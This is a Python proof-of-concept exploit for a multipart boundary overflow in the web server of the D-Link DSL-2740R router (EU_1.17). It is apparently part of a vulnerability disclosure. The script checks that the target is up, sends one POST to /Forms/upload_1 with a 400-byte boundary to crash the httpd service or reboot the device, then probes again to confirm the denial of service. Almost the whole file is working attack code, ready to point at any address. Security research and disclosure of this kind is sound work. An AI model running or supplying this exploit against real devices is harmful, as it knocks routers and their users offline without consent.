#!/usr/bin/env python3
"""
Non-destructive PoC — D-Link DSL-2740R EU_1.17 multipart boundary overflow
(advisory: FIND-0003-content-type-multipart-boundary-overflow)

For authorized targets only. Single request; writes nothing to flash; changes no configuration.
Demonstrated effect: an over-long multipart boundary corrupts the httpd multipart parser working
storage, crashing the web service / rebooting the device (DoS).

Usage: python3 poc_find0003.py <target_ip> [port]
"""
import socket
import sys


def post_with_boundary(host: str, port: int, boundary: bytes, timeout: float = 5.0) -> bytes:
    body = b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"x\"\r\n\r\n1\r\n--" + boundary + b"--\r\n"
    req = (
        b"POST /Forms/upload_1 HTTP/1.0\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"\r\n" + body
    )
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.sendall(req)
        try:
            return s.recv(512)
        except socket.timeout:
            return b""


def probe_alive(host: str, port: int, timeout: float = 5.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.sendall(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
            return len(s.recv(512)) > 0
    except OSError:
        return False


def main() -> int:
    if len(sys.argv) < 2:
        print(__doc__)
        return 2
    host, port = sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 80
    print(f"[*] Target {host}:{port}")
    if not probe_alive(host, port):
        print("[-] Liveness probe failed, aborting")
        return 1
    print("[+] Liveness probe OK")

    boundary = b"A" * 400  # >70-byte design capacity, < 641-byte header line limit
    print(f"[*] Sending over-long boundary request (boundary {len(boundary)} chars)")
    try:
        resp = post_with_boundary(host, port, boundary)
        print(f"[*] Response: {resp[:80]!r}")
    except OSError as e:
        print(f"[!] Connection error: {e} (crash indicator)")

    import time
    time.sleep(2)
    if probe_alive(host, port):
        print("[-] Post-attack probe OK: target may not be affected")
        return 1
    print("[+] Web service unresponsive — vulnerability triggered, DoS confirmed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
